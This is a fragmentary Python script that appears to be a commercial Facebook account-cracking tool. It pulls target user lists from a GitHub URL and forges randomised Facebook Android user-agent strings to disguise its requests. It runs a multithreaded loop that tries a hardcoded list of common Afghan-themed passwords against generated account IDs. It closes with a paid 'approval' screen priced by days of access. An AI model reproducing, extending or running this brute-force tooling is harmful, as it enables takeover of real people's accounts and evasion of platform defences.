...
try:
    prox= requests.get('https://github.com/afglion5/ua/blob/main/user.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/afglion5/ua/blob/main/user.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://github.com/afglion5/ua/blob/main/user.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/Lion.txt.etc..')
                                linex()
...
def afg():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'600700','afghan12345','afghan123','400500','afghanistan','khankhan','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','afghan1122','khan123']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/Orca-Android;FBAV/464.0.0.0.55;FBBV/451805674;FBPN/com.facebook.katana;FBLC/en_US;FBBV/38150827;FBCR/Ufone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
...
def approval():
  ...
  os.system('clear')
  print(logo) 
  print("\033[1;37m \u001b[36m\033[1;37m[3days 80afg][7days 130afg][15days 180afg][30days 280]You Need Approval \033[1;37m")
